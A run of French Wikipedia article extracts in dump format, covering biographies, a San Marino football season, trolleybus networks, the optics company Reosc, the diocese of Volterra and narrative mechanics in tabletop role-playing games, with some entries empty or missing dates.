Frances Farrand Dodge tout au long de sa carrière est l'objet d'expositions personnelles, comme à la Pennsylvania Academy of Fine Arts, l'Art Institute of Chicago avec la Chicago Society of Etchers, le Cincinnati Institute of Fine Arts ou encore à la Print Makers Society of California. En 1921, elle obtient le second prix de la Fine Arts Competition de la Minnesota State Fair. Ces œuvres font partie de collections prestigieuses comme celles du Smithsonian American Art Museum, du Mobile Museum of Art ou encore de l'University of Nebraska State Museum.

</doc>
<doc id="7276673" url="https://fr.wikipedia.org/wiki?curid=7276673" title="Championnat de Saint-Marin de football 2013-2014">
Championnat de Saint-Marin de football 2013-2014

La saison 2013-2014 du championnat saint-marinais de football est la vingt-huitième édition de la première division saint-marinaise. Les quinze clubs participants répartis en deux groupes affrontent à deux reprises les équipes de leur groupe et une fois celle de l'autre groupe, les trois premiers de chaque groupe se retrouvent en playoffs pour se disputer la victoire finale.
Deux places du championnat sont qualificatives pour les compétitions européennes, la troisième place revenant au vainqueur de la Coppa Titano 2013-2014.
Le SP Tre Penne, tenant du titre, tente de conserver son trophée cette saison. Le club, terminant de son groupe, participe aux play-offs, dont il sort après deux revers consécutifs. C'est finalement le SP La Fiorita qui remporte le championnat pour la troisième fois de son histoire.
Qualifications en coupe d'Europe.
Grâce à sa victoire en finale du championnat, le SP La Fiorita participera au de qualification des champions de la Ligue des champions 2014-2015.
Le vainqueur de la Coppa Titano, AC Libertas, disputera la Ligue Europa 2014-2015, tout comme le finaliste du championnat, le SS Folgore/Falciano.
Les 15 clubs participants.
En raison du peu de nombre de stades se trouvant sur le territoire de Saint-Marin, les matchs sont joués par tirage au sort sur un des six stades suivants :

</doc>
<doc id="7276674" url="https://fr.wikipedia.org/wiki?curid=7276674" title="Averlant">
Averlant



</doc>
<doc id="7276678" url="https://fr.wikipedia.org/wiki?curid=7276678" title="Îles artificielles">
Îles artificielles



</doc>
<doc id="7276683" url="https://fr.wikipedia.org/wiki?curid=7276683" title="Cesare Benedetti (football, 1920-2002)">
Cesare Benedetti (football, 1920-2002)

Cesare Benedetti, né le à Trévise et mort le dans sa ville natale, est un footballeur italien.
Biographie.
Lors de la saison 1941-1942, Cesare Benedetti remporte le titre de champion d'Italie avec l'AS Roma.

</doc>
<doc id="7276686" url="https://fr.wikipedia.org/wiki?curid=7276686" title="Chester Barnett">
Chester Barnett

Chester Barnett, né le à Piedmont (Missouri) et mort le à Jefferson City (Missouri), est un acteur américain du cinéma muet.
Biographie.
Il a tourné près de 200 films entre 1912 et 1920.

</doc>
<doc id="7276687" url="https://fr.wikipedia.org/wiki?curid=7276687" title="Cinq Familles">
Cinq Familles



</doc>
<doc id="7276689" url="https://fr.wikipedia.org/wiki?curid=7276689" title="Trolleybus d'Esslingen am Neckar">
Trolleybus d'Esslingen am Neckar

Le est un réseau de trolleybus qui dessert l'agglomération allemande de Esslingen am Neckar. C'est l'une des trois villes allemandes, avec Eberswalde et Solingen, à être actuellement dotée d'un tel réseau.
Réseau actuel.
Aperçu général.
Le réseau actuel compte deux lignes.
Matériel roulant.
Le réseau utilise neuf Van Hool AG300T.

</doc>
<doc id="7276691" url="https://fr.wikipedia.org/wiki?curid=7276691" title="Claude Clément (général)">
Claude Clément (général)

Claude Clément, né le à Romans (Drôme) et mort le à Cap Français (Saint-Domingue), est un général de brigade français de la Révolution française.
États de service.
Il entre en service comme soldat au régiment de Maine-infanterie en 1777, il est nommé caporal en 1780, et il est congédié en 1783.
Marchand à Romans, il devient sous-officier, capitaine, puis en octobre 1793, lieutenant-colonel au de réquisition de Romans qui deviendra le des volontaires de la Drôme. De 1793 à 1795, il sert à l’armée d’Italie. Il est nommé chef de brigade le à la d’infanterie de ligne, puis à la d’infanterie légère le .
Il est promu général de brigade par Joubert le et confirmé par le directoire en 1799. En 1799, il est affecté à l'armée de Naples, et il est fait prisonnier à Coni le .
Libéré le , il part pour Saint-Domingue, où il meurt le , de la fièvre jaune.

</doc>
<doc id="7276692" url="https://fr.wikipedia.org/wiki?curid=7276692" title="Trolleybus d'Eberswalde">
Trolleybus d'Eberswalde

Le est un réseau de trolleybus qui dessert l'agglomération allemande de Eberswalde. C'est l'une des trois villes allemandes, avec Esslingen am Neckar et Solingen, à être actuellement dotée d'un tel réseau.
Réseau actuel.
Aperçu général.
Le réseau actuel compte deux lignes.
Matériel roulant.
Depuis 2010, le réseau utilise 12 Solaris Trollino 18.

</doc>
<doc id="7276693" url="https://fr.wikipedia.org/wiki?curid=7276693" title="Messa da Requiem">
Messa da Requiem



</doc>
<doc id="7276697" url="https://fr.wikipedia.org/wiki?curid=7276697" title="Lorenzo Perini">
Lorenzo Perini

Lorenzo Perini, né le à Milan, en Italie, est un athlète italien, spécialiste du 110 mètres haies.
Biographie.
Originaire de Saronno, il est né à Milan.
Le , Lorenzo Perini bat en 13 s 32 le record des Championnats d'Europe juniors à Rieti en séries, record national junior qu'il détenait et avait battu deux fois en 2013.
Il avait été demi-finaliste des Championnats du monde juniors à Barcelone en 2012. En 2011, il avait remporté le titre du 110 m haies lors du Festival olympique de la jeunesse européenne devant le Français Wilhem Belocian.
Il a remporté le titre de champion national junior également à Rieti en 2013, en 13 s 39.
Il porte son record avec les haies hautes à 13 s 70, le à Biberach an der Riss. Le , il améliore ce record encore en 13 s 67 lors des Championnats nationaux espoirs à Bressanone. Le , il porte ce record à 13 s 62 -0.1 à Savone (Fontanassa), temps qu'il approche en finale du Golden Gala 2017. Le , il égale ce record en finale du 110 m haies des Championnats d'Europe d'athlétisme par équipes 2017 à Villeneuve-d'Ascq. Le , il remporte le titre national à Trieste en 13 s 54 mais avec vent favorable (+ 3,0 m/s).
Lors des Jeux méditerranéens de 2018, il remporte le titre en battant son record personnel en 13 s 49, temps qui le qualifie pour les Championnats d'Europe à Berlin. En demi-finale des Championnats d’Europe 2018, il court en 13 s 50 mais manque la finale de 5/.
Le , il est battu de peu par Antonio Alkana à Montgeron et court en 13 s 51. Le à La Chaux-de-Fonds, il porte son record personnel à 13 s 47 (+ 0,7 m/s), deuxième derrière Eduardo de Deus.

</doc>
<doc id="7276700" url="https://fr.wikipedia.org/wiki?curid=7276700" title="Mush">
Mush

Mush est un mot anglais, qui signifie « bouillie ». En français on l'utilise dans des contextes particuliers.

</doc>
<doc id="7276702" url="https://fr.wikipedia.org/wiki?curid=7276702" title="Cosa Nostra">
Cosa Nostra



</doc>
<doc id="7276704" url="https://fr.wikipedia.org/wiki?curid=7276704" title="Théodore Agallianos">
Théodore Agallianos

Théodore Agallianos (en grec ) est un ecclésiastique et écrivain religieux byzantin du , né à Constantinople vers 1400, mort entre 1468 et 1474. Il s'illustra comme opposant à l'union des Églises latine et grecque proclamée au concile de Florence en 1439.
Biographie.
Marié, ordonné diacre en 1425, il intègre le clergé de Sainte-Sophie de Constantinople et y exerce plusieurs fonctions importantes. Quand la délégation byzantine dirigée par l'empereur Jean VIII et le patriarche Joseph II quitte Constantinople pour participer aux assemblées conciliaires de Ferrare et de Florence, en novembre 1437, il est empêché de s'y joindre par une maladie. Lorsqu'elle est de retour, début 1440, il prend part au mouvement de rejet de l'union proclamée, dirigé par Marc d'Éphèse, seul évêque de la délégation à avoir refusé de signer : le , le patriarche nouvellement intronisé Métrophane II célébrant à Sainte-Sophie une liturgie mentionnant le pape, les opposants refusent de participer à la communion. Déclaré suspens, Agallianos démissionne de ses charges, qu'il ne reprendra qu'après le retrait de Métrophane le .
Après la mort de Marc d'Éphèse (), la direction du parti anti-unioniste est assumée par Georges Scholarios, ancien conseiller impérial rallié par Marc, dont Agallianos devient un proche. Il participe aux discussions qui se tiennent alors sur le sujet, et signe le rapport défavorable établi par une commission de quinze membres nommée par l'empereur (novembre 1445).
Ayant de nombreux ennemis, il est totalement disgracié sous le pontificat du patriarche Isidore II (1456-1462), et perd alors sa charge de grand chartophylax de Sainte-Sophie. Mais il revient ensuite en faveur : d'après les travaux de Christos Patrinellis, il n'est autre que Théophane, métropolite de Médeia à partir de 1468 environ. Il doit être mort avant le , car un successeur est signalé à cette date à Médeia.
Œuvre.
Il est l'auteur de trois textes de réfutation contre l'Église latine et de trois autres contre le judaïsme, et d'autre part de deux écrits philosophiques ("Sur la Providence", après la grande peste de 1466, et "Sur l'âme"). Il a également laissé un récit de la prise de Constantinople par les Ottomans ("Χρονικὸν σημείωμα περὶ τῶν ὑπὸ τῶν Τούρκων ἐπενεχθέντων κακῶν"), une liste des métropoles du patriarcat sous Andronic II, et dix-sept lettres : deux au métropolite Pachôme d'Amasée qui datent de la période 1441-45, les autres qui datent d'après 1453, dont cinq comme métropolite de Médeia. Il est le destinataire de trois lettres de Georges Amiroutzès, datant de la période 1468-70, portant sur le traité "Sur la Providence", et transmises avec sa correspondance (avec aussi une lettre d'Amiroutzès à Michel Critoboulos portant sur le même sujet).

</doc>
<doc id="7276707" url="https://fr.wikipedia.org/wiki?curid=7276707" title="Reosc">
Reosc

Reosc (acronyme de « Recherche et étude en optique et sciences connexes ») est une entreprise française fondée en 1937, filiale du groupe Safran. Reosc conçoit, réalise et intègre des optiques de haute performance pour l’astronomie, le spatial, les grands lasers ou l’industrie des semi-conducteurs dans les domaines civil et militaire.
Historique.
L'entreprise REOSC est fondée en 1937 par un groupe de scientifiques de l’Institut d'optique de Paris, parmi lesquels Henri Chrétien et Charles Fabry. La société trouve son véritable développement avec André Bayle en 1960, qui s'adjoindra la collaboration de Georges Penciolelli de l'Institut d'optique-CNRS. En 1978, REOSC est achetée par la Société de fabrication d’instruments de mesure (SFIM) par l'intermédiaire de Georges Penciolelli, fondée elle en 1947 par Marcel Ramolfo et François Hussenot, à qui l’on doit l’invention des boîtes noires. Elle n’en devient une réelle filiale qu’en 1992 lors de la fusion avec EVAP Service (réalisation de couches minces) et MTO (aluminure de miroirs). En 1996, la division optronique de la SFIM fusionne avec celle de Matra. Après le rachat par la SAGEM de la SFIM en 1999, REOSC intègre le business unit de la division Optronique de la Sagem en tant qu'établissement.
En 2005, la SAGEM fusionne avec la SNECMA pour donner naissance au groupe Safran.
Le , REOSC devient une filiale à 100 % de Sagem Défense Sécurité, devenu Safran Electronics &amp; Defense.
Domaines d'activité.
L'entreprise étudie, conçoit, réalise et intègre des éléments optiques de haute performance et des équipements opto-mécaniques pour quatre domaines d’activité
Astronomie terrestre.
L’entreprise développe et produit notamment des grands miroirs monolithiques de 4 à , des segments de miroirs primaires pour de très grands instruments et des systèmes de télescopes « clés en main » intégrant télescope, dôme, système de contrôle-commande, équipement de maintenance et génie civil.
Elle fournit également des équipements opto-mécaniques, des correcteurs de champ, des compensateurs de dispersion atmosphérique, ainsi que des lentilles correctrices et filtres larges pour caméras à grand champ.
Reosc a notamment produit les miroirs monolithiques de du "Very Large Telescope", le miroir de du "Gran Telescopio Canarias" et les prototypes des miroirs du futur télescope de de l’ELT (Télescope géant européen).
Solutions pour satellites.
L’entreprise conçoit et produit des optiques spatiales, des équipements de test au sol et assure le suivi de solutions électroniques et hybrides.
Ces productions concernent les télescopes conventionnels (comprenant des miroirs allégés en vitrocéramique) tel que le télescope SOFIA pour la NASA, les télescopes de type TMA ("three-mirror anastigmat"), les ensembles en carbure de silicium (par exemple, Reosc a réalisé les modules optiques FOR, COL et CAM du spectrographe NIRSpec pour le télescope spatial américain James Webb), ou encore pour le satellite GAIA
Industrie des semi-conducteurs.
L’entreprise déploie des compétences spécifiques dans la réalisation des semi-conducteurs : l’ingénierie opto-mécano-thermique de haute précision, l’usinage de matériaux vitrocéramique et carbure de silicium, le polissage pour l'ultraviolet profond ("deep ultraviolet", DUV) et extrême (EUV), les traitements anti-reflet pour le DUV, le montage opto-mécanique haute précision (sub-micrométrique) et haute stabilité, propreté et contamination.
Toutes ces compétences concourent au développement des applications clés pour les réalisations industrielles : collection de flux, illumination, imagerie, éléments structuraux de haute stabilité, équipements divers haute performance pour EUV et DUV.
Systèmes optiques pour lasers à haute énergie.
L’entreprise développe et produit des composants optiques et opto-mécaniques pour les instituts et grands programmes scientifiques entreprenant des recherches autour des lasers de puissance.

</doc>
<doc id="7276793" url="https://fr.wikipedia.org/wiki?curid=7276793" title="Louis Frémy">
Louis Frémy

Louis Frémy, né le à Saint-Fargeau (Yonne) et décédé le à Paris, est un homme politique et conseiller d'Etat français.
Biographie.
Avocat à Paris en 1829, il est maire de Saint-Fargeau en 1831 et conseiller d'arrondissement. Auditeur au Conseil d’État en 1833, il est sous-préfet de Domfront en 1835 et de Gien en 1837.
En 1842, il est secrétaire de la commission administrative des chemins de fer, puis inspecteur général des chemins de fer en 1845. En 1848, il devient chef du personnel du ministère de l'Intérieur. Conseiller général en 1848, il est député de l'Yonne de 1849 à 1851, siégeant à droite, avec les monarchistes. Il est gouverneur du Crédit foncier de 1857 à 1877, et gouverneur du Crédit agricole.
En 1862 il est nommé vice-président de la Société du Prince Impérial par l'impératrice Eugénie.
Il crée en 1864 la société anonyme, dénommée Compagnie de la Dombes, pour construire et exploiter une ligne de chemin de fer et dessécher et mettre en valeur six mille hectares au moins d'étangs, avec François Barthélemy Arlès-Dufour, Alexandre Bodin, Comte Le Hon, Félix Mangini, Amédée Sellier et Lucien Mangini, ce dernier agissant en son nom personnel et celui de messieurs Henri Germain, Louis Guérin et Gabriel Saint-Olive.
Il est de nouveau député de l'Yonne de 1865 à 1869, siégeant dans la majorité dynastique.

</doc>
<doc id="7276840" url="https://fr.wikipedia.org/wiki?curid=7276840" title="Saint-Michel-de-Napierville">
Saint-Michel-de-Napierville



</doc>
<doc id="7276842" url="https://fr.wikipedia.org/wiki?curid=7276842" title="Trolleybus d'Arnhem">
Trolleybus d'Arnhem

Le est un réseau de trolleybus qui dessert l'agglomération d'Arnhem aux Pays-Bas. C'est la seule ville néerlandaise à être actuellement dotée d'un tel réseau.
Réseau actuel.
Aperçu général.
Le réseau actuel compte six lignes.
Matériel roulant.
Depuis 2013, le réseau utilise 11 Hess Swisstrolley 4, le renouvellement du parc se poursuivra sur 2016-2017 avec 20 autres exemplaires de ce modèle.

</doc>
<doc id="7276849" url="https://fr.wikipedia.org/wiki?curid=7276849" title="Explosion immédiate">
Explosion immédiate

 
Explosion immédiate ("") est un film d'action américain réalisé par Christian Duguay sorti en 1992.
Synopsis.
À la suite de violentes explosions ciblant la classe politique, le gouvernement décide de faire appel à un expert en explosifs du FBI pour mener l’enquête. À chaque attentat, pas le moindre indice, ni la moindre trace d'explosif. Danny O'Neill (Pierce Brosnan) doit mettre fin à cette série d'actions terroristes qui ébranle le pouvoir, mais le temps joue contre lui...

</doc>
<doc id="7276859" url="https://fr.wikipedia.org/wiki?curid=7276859" title="Rudolf Perak">
Rudolf Perak

, né le à Vienne et mort le à Munich, est un compositeur autrichien, auteur notamment de nombreuses musiques de film.
Biographie.
Rudolf Perak reçoit une formation artistique au Mozarteum à Salzbourg. Il exerce ensuite comme maître de chapelle à la province impériale et royale, comme à Merano (Tyrol du Sud), mais aussi à Hambourg à l' et au Metropol Theater de Berlin. En outre, il a travaillé comme compositeur indépendant et a écrit des opérettes comme "Frau im Frack", "Der Page des Herzogs" et "Ein Mädel wie Du".
À l'aube du cinéma parlant, Perak a également été actif pour ce milieu et a écrit plusieurs œuvres musicales en collaboration avec d'autres compositeurs comme Robert Stolz, Nicholas Brodszky et Michael Jary. Il a écrit plusieurs musiques de films pour le couple formé par le réalisateur belge Jan Vanderheyden et Edith Kiel.
Si l'écriture de partitions pour des films de fiction ne représente qu'une faible proportion de son travail, la plus gros de son œuvre fut l'écriture de partitions pour des films documentaires et culturels (environ 300 pièces). Ainsi, il a écrit la musique de "Josef Thorak, Werkstatt und Werk" et de "Arno Breker", deux films documentaires allemands réalisés par Hans Cürlis et Arnold Fanck et produit par Leni Riefenstahl. En outre, Perak a écrit la musique pour nombre de séries télévisées.

</doc>
<doc id="7276862" url="https://fr.wikipedia.org/wiki?curid=7276862" title="Liste des bourgmestres de Maastricht">
Liste des bourgmestres de Maastricht

La ville de Maastricht est administrée par des bourgmestres depuis la période de la double seigneurie.
Après la Révolution française, elle administrée par un "maire" puis sous le Royaume des Pays-Bas par un "bourgmestre". 

</doc>
<doc id="7276863" url="https://fr.wikipedia.org/wiki?curid=7276863" title="Diocèse de Volterra">
Diocèse de Volterra

Le diocèse de Volterra (en latin : ' ; en italien : ') est un diocèse de l'Église catholique en Italie, suffragant de l'archidiocèse de Pise et appartenant à la région ecclésiastique de Toscane.
Territoire.
Il est situé sur 5 provinces de la Toscane. La plus grande partie est dans la province de Pise, les autres fractions de la province étant dans l'archidiocèse de Pise et le diocèse de San Miniato. Les communes de Montieri et les fraziones de Massa Marittima et Monterotondo Marittimo dans la province de Grosseto, l'autre fraction de la province étant gérée par les diocèses de Grosseto, de Pitigliano-Sovana-Orbetello et Massa Marittima-Piombino. Il possède la commune de Radicondoli et les fraziones de Casole d'Elsa et de San Gimignano dans la province de Sienne, l'autre partie de la province est dans les diocèses de Fiesole, d'Arezzo-Cortone-Sansepolcro, et de Montepulciano-Chiusi-Pienza. La commune de Bibbona et une frazione de Cecina dans la province de Livourne, l'autre partie de la province est dans le diocèse de Massa Marittima-Piombino. Il gère la commune de Montaione et une frazione de Castelfiorentino de la ville métropolitaine de Florence ; l'autre fraction de cette ville métropolitaine est partagée par l'archidiocèse de Florence et les diocèses de San Miniato, de Fiesole et de Faenza-Modigliana. Son territoire est d'une superficie de divisé en 88 paroisses regroupées en 6 archidiaconés. L'évêché est à Volterra avec la cathédrale de l'Assomption.
Histoire.
La tradition catholique attribue l’évangélisation de Volterra à saint Romulus envoyé par saint Pierre et au pape Lin, originaire de Volterra et deuxième pape. La première preuve du diocèse de Volterra remonte au /, avec la découverte de pierres tombales paléochrétiennes visibles au musée Guarnacci, provenant des catacombes de la Balze. Un document important remonte à la seconde moitié du : la lettre du pape Gélase Ier (492) dans laquelle le pontife reprend l'évêque de Volterra. Dans cette lettre, il ressort que l'église de Volterra est bien constituée. Les premiers évêques mentionnés sont Eumanzio et Opilione, prédécesseurs immédiats d'Eucaristio, peut-être diacre de Volterra, qui intrigue pour occuper le trône de l'évêque, mais accusés de simonie et d'autres crimes et donc été condamnés par le pape Gélase. La même correspondance mentionne l'évêque Elpidio, successeur d'Eucaristio, présent au concile de 502 organisé par Symmaque.
À partir du début du Moyen Âge, les saints , Octavien, sont vénérés à Volterra ; des traditions ultérieures les transforment en Africains qui fuient l'Afrique à la suite de la persécution des Vandales. À partir du , Just est vénéré comme évêque de Volterra. Au culte de ces saints, on ajoute celui des martyrs Attinia et Greciniana, dont les reliques sont découvertes en 1140 dans l'église de San Clemente di Volterra. Jusqu'au , peu d'évêques peuvent historiquement être attribués au siège de Volterra : Gaudenzio, mentionné dans la correspondance du pape Pélage Ier (556-561) ; Geminiano, qui prend part au concile de Latran de 649, et Marciano, présent au concile de Rome de 680 appelé par le pape Agathon dans lequel le monothélisme est condamnée ; Gaudenziano, dont il reste un témoignage épigraphique datant de l’époque du roi lombard Cunipert (688-700) ; et Tommaso, dont le nom figure dans une bulle du pape Étienne II de 752. À partir de l'ère franque (774), en l'absence d'une véritable organisation du pouvoir civil, les évêques assument un rôle de plus en plus important dans la vie citadine, grâce également aux nombreux privilèges qui leur sont accordés par les empereurs et toujours conservés dans les archives historiques diocésaines. Le plus ancien est le privilège accordé par Louis le Pieux à Grippo en .
Avec l'évêque Guido (1042-1061), le pouvoir civil des évêques est renforcé sur la ville de Volterra ; c'est ainsi que naît la création de la seigneurie épiscopale, en particulier au . Ruggero Gisalbertini (1103-1132) fait reconstruire la cathédrale consacrée par le pape Calixte II en 1120 ; il introduit les camaldules dans l', fondée en 1034 par Gunfredo, nommé archevêque de Pise, il conserve la charge d'évêque de Volterra jusqu'à sa mort ; Galgano (1150-1168) dont l'épiscopat atteint l'apogée du pouvoir temporel des évêques de Volterra, et qui est tué pour son opposition aux premières tentatives d'autonomie municipale ; Ugo Saladini (1171-1184), vénéré comme saint, défenseur tenace des droits de l'Église, fonde un collège pour les clercs. Pendant cette période l'évêque obtient de l'empereur les titres de prince du saint Empire et comte palatin de Toscane ainsi que le privilège de « battre monnaie », de reconnaître les consuls et les podestats, et de nommer les juges et notaires. Le pouvoir temporel des évêques entre en crise au début du , lors des épiscopats d'Ildebrando (1185-1211) et de Pagano (1212-1239), tous deux de la famille Pannocchieschi, luttent vainement contre la municipalité pour préserver leurs privilèges et leurs pouvoirs sur la ville. L'évêque Pagano dell'Ardenghesca (1213), tente de s'approprier le pouvoir temporel sur la ville et le conflit perdure avec ses successeurs, particulièrement avec Raineri Belforti (1301).
La première fondation monastique sur le territoire du diocèse remonte au , avec le monastère bénédictin de Saints Giusto et Clemente, fondé en 1034 et transmis plus tard aux camaduldes. En 1201, les cisterciens et les olivetains arrivent dans le diocèse en 1339 ; les franciscains sont attestés à partir de 1238, les clarisses à partir de 1244 et les augustins à partir de 1279. Les comptes rendus d'un synode célébré par Filippo Belforti en 1356 nous apprennent qu'au moment de la division du diocèse en 6 vicariats diocésains, à savoir la ville de Volterra, la Val d'Elsa, la Val d'Era, les vallées de Cecina et de Marina, le Val di Strove et le sixième de la montagne, pour un total de 480 églises, 51 pièves et 29 monastères.
Ce territoire diocésain reste pratiquement inchangé jusqu'à la fin du . En effet, en 1592, Volterra cède une partie de son territoire au profit de l'érection du diocèse de Colle di Val d'Elsa. En outre, à partir de 1462, l’église paroissiale de San Gimignano est exemptée de la juridiction des évêques de Volterra. Les conflits répétés entre les évêques et les prévôts de San Gimignano sont résolus par le pape Pie VI qui, par la bulle "Dum nos singuli" du , décide de séparer le prévôt de San Gimignano, avec ses pièves et ses paroisses, du diocèse de Volterra. Les premières tentatives pour fonder le séminaire sont mises en œuvre par l'évêque Guido Serguidi (1574-1598) puis organisées avec plus de succès par l'évêque Niccolò Sacchetti en 1640. Au , Giuseppe Dumesnil, détesté par la population et souffrant de maladie mentale, est enfermé au château Saint-Ange jusqu'à sa mort, tandis que le siège épiscopal est confié à des administrateurs apostoliques.
Le , sous la bulle "Vel ab antiquis" du pape Pie IX, le diocèse, qui était jusqu'alors immédiatement soumis au Saint-Siège, devirnt suffragant de l'archidiocèse de Pise. Pour compenser la perte d'autonomie ecclésiastique, le pape Pie IX accorde aux évêques de Volterra le privilège de porter le pallium par la bulle "Ubi primum placuit" du . Le , le diocèse cède une portion de son territoire comprenant les vicariats de Chiusdino et Monticiano à l'archidiocèse de Sienne. Le l'évêque Vasco Giuseppe Bertelli accueille le pape Jean-Paul II en visite pastorale dans le diocèse.

</doc>
<doc id="7276871" url="https://fr.wikipedia.org/wiki?curid=7276871" title="Marie Denis Larabit">
Marie Denis Larabit

Marie Denis Larabit est un militaire et homme politique français né le à Roye (Somme) et décédé le à Paris.
Biographie.
La famille de Marie Denis Larabit est originaire de Coulommiers. Il est le fils de Nicolas Larabit, contrôleur ambulant des Fermes du roi, officier municipal d'Irancy et maire de Roye, et de Jeanne Marguerite Henriette Boulanger. . Marié à Marie Adélaïde Elisa Michaud, fille du général-baron Claude Ignace François Michaud et de Marie Aglaé Flore Soucanye de Landevoisin, il est le beau-père de .
Après avoir commencé ses études à Roye, il les termine au lycée Napoléon à Paris, ayant notamment pour condisciples Odilon Barrot et Charles de Rémusat. Il remporte les premiers prix de mathématiques aux concours généraux de 1809 et de 1810, et entre à l'École polytechnique, dont il sort, classé second, dans le corps du génie en 1812. 
Il participe à la campagne de Saxe, est chargé d'exécuter à Wurtzbourg des travaux de défense, et assiste aux batailles de Leipzig et de Hanau. Attaché, comme officier de service de l'arme du génie, à l'état-major de Napoléon, puis versé dans la garde impériale, il fait, aux côtés de l'empereur, la campagne de 1814, et l'accompagne à l'île d'Elbe. Durant les Cent-Jours, il exécute, sous les ordres du général Haxo, quelques travaux de fortifications en avant de Belleville et de Ménilmontant afin de mettre Paris à l'abri d'un coup de main. Envoyé ensuite à l'armée du Nord, il se distingue aux trois journées de Fleurus, de Ligny et de Waterloo. Licencié et rayé des cadres de l'armée sous la Restauration, il se retire dans sa maison patrimoniale d'Irancy, où est né l'architecte Soufflot, son grand- oncle. En 1818, il est rappelé au service, travaille aux fortifications de Rocroi, de Bayonne, prend part à l'expédition d'Espagne à l'état-major du général Dade, et devient secrétaire-adjoint du comité des fortifications en 1826. 
Le 5 juillet 1831, il est élu député, par le 1er collège de l'Yonne (Auxerre). Il adresse alors chaque année à ses électeurs le compte-rendu de ses votes à la Chambre, tant qu'il occupe ces fonctions. Il est successivement réélu : le 21 juin 1834, le 4 novembre 1837, le 2 mars 1839, le 9 juillet 1842 et le 1er août 1846. Durant la monarchie de Juillet, il est donc à la Chambre et fait rapidement partie de l'opposition : il parle et vote contre l'hérédité de la pairie, pour l'extension du droit électoral, pour la Pologne, pour les fortifications de Paris, est membre de la commission du budget, sollicite l'autorisation de défendre le prince Louis-Napoléon après l'échauffourée de Strasbourg, signe le compte-rendu de 1832, combat la dotation du duc de Nemours et l'indemnité Pritchard, et réclame à maintes reprises le paiement des arriérés de traitement des membres de la Légion d'honneur.
Au lendemain de la révolution de février 1848, il est nommé directeur-adjoint du personnel au ministère de la Guerre et s'efforce de maintenir l'ordre dans Paris, en allant porter aux insurgés des paroles de conciliation et de paix ; Affre est tué à ses côtés, et il faillit lui-même subir le même sort à la barrière de Fontainebleau. 
Le 23 avril 1848, il est élu représentant de l'Yonne à l'Assemblée constituante. Il fait partie du comité de la guerre, et vote pour le bannissement de la famille d'Orléans, contre les poursuites contre Louis Blanc et Marc Caussidière, contre l'impôt progressif, pour l'incompatibilité des fonctions, contre l'amendement Grévy, pour l'ensemble de la Constitution, pour la proposition Rateau, pour l'expédition de Rome, contre la demande de mise en accusation du président et des ministres. Réélu dans le même département, le 23 mai 1849, à la Législative, il soutient la politique du Louis-Napoléon Bonaparte, et, en juillet 1851, dépose une proposition de révision de la Constitution réclamant l'abrogation de l'article 45 relatif à la non-rééligibilité du Président, et demandant pour le peuple la liberté de disposer de ses suffrages comme il l'entendrait au moment de l'élection présidentielle. Mais la majorité des deux tiers ne peut être atteinte (446 pour, 278 contre), et la proposition est rejetée. Surpris par le coup d'État du 2 décembre 1851, il proteste si vivement contre ce coup de force qu'il est enfermé pendant quelques jours au fort de Vincennes. Mais, à la suite d'un déjeuner avec le prince Louis- Napoléon, il cesse son opposition et est élu, le 29 février 1852, député au Corps législatif dans la 1re circonscription de l'Yonne, comme candidat officiel.
L'année suivante, le 4 mars 1853, il est nommé sénateur. Membre du conseil de l'ordre de la Légion d'honneur depuis 1851, il est grand-officier en 1861. À la Chambre haute, il fait partie de nombreuses commissions, ouvre (20 février 1862) la discussion de l'Adresse par un discours en faveur de la Pologne, dans lequel il fait appel aux sentiments généreux d'Alexandre II, vote contre les nouvelles lois sur la presse et les réunions publiques, appuie la politique guerrière du second Empire, réclame () une intervention en faveur du Danemark attaqué par l'Autriche et par la Prusse, représente officiellement l'empereur à Grenoble (1868) à l'inauguration de la statue de Napoléon, demande instamment au début de la guerre franco-allemande (juillet 1870) d'être employé à la défense de Metz, et, le 4 septembre, au Sénat, proteste « contre la force qui empêchait le Corps législatif de délibérer avec maturité ». Durant le siège de Paris, il offre en vain ses services comme officier du génie. 
Larabit vit dans la plus profonde retraite à partir de cette époque. On a de lui, outre plusieurs rapports, de nombreux Mémoires sur les chemins de fer, un Éloge de Vauban et un Éloge de Carnot.
Décorations.
Par décret du , Maris-Denis Larabit est élevé à la dignité de grand officier de la Légion d'honneur.

</doc>
<doc id="7276874" url="https://fr.wikipedia.org/wiki?curid=7276874" title="Guillermo Varela">
Guillermo Varela

Guillermo Varela est un footballeur international uruguayen né le à Montevideo. Il évolue au poste d'arrière droit au CR Flamengo.
Biographie.
En club.
Prêté à l'Eintracht Francfort pour la saison 2016-2017, il se blesse gravement dès son deuxième match avec sa nouvelle équipe. Il manque plusieurs mois de compétition et ne rejoue qu'en fin de saison, participant en tout à sept matches de championnat. Alors qu'il est vraisemblable qu'il soit titulaire en finale de la Coupe d'Allemagne de football 2016-2017, il se fait tatouer dans les jours précédents le match contre l'avis du club et du coup se retrouve privé de finale. Le club met fin à son prêt alors qu'une prolongation était à l'étude invoquant le manque de professionnalisme du joueur.
En sélection.
Guillermo Varela commença sa carrière internationale le 10 novembre 2017 lors d'une rencontre amicale contre la Pologne soldée par un score de 0-0. 
En juin 2018, il est sélectionné par Óscar Tabárez pour participer à la Coupe du Monde 2018, mais il n'y joue aucun match. Les uruguayens seront sortis en quarts-de-finale par la France, future championne du monde.
Le , il est sélectionné par Diego Alonso pour participer à la Coupe du monde 2022.
Statistiques.
En sélection nationale.
! rowspan="2" |Saison
! rowspan="2" |Sélection
! colspan="4" |Phases finales 
! colspan="3" |Éliminatoires CDM 
! colspan="3" |Matchs amicaux
! colspan="3" |Total
! Compétition
!style="border-right-style:hidden;width:2em"| !!style="width:2em"| !!style="width:2em; border-left-style:hidden;" | 
!style="border-right-style:hidden;width:2em"| M !!style="width:2em"| B !!style="width:2em; border-left-style:hidden;" | Pd !!style="border-right-style:hidden;width:2em" | M !!style="width:2em" | B !!style="width:2em; border-left-style:hidden;" | Pd !!style="border-right-style:hidden;width:2em" | M !!style="width:2em" | B !!style="width:2em; border-left-style:hidden;" | Pd

</doc>
<doc id="7276883" url="https://fr.wikipedia.org/wiki?curid=7276883" title="Mécanisme narratif dans les jeux de rôle sur table">
Mécanisme narratif dans les jeux de rôle sur table

Le but des jeux de rôle sur table, et de manière plus générale des jeux narratifs, est de créer une histoire. La manière dont se construit l'histoire utilise des mécanismes qui sont souvent implicites dans le cas des jeux de rôle datant d'avant les années 2000 — les ouvrages contiennent au mieux une section « conseils aux meneurs de jeu » — ou bien qui sont édictés par des règles dans le cas d'un certain nombre de jeux publiés à partir des années 2000 (dont les jeux dits narratifs).
On peut distinguer typiquement trois phases dans l'élaboration de l'histoire :
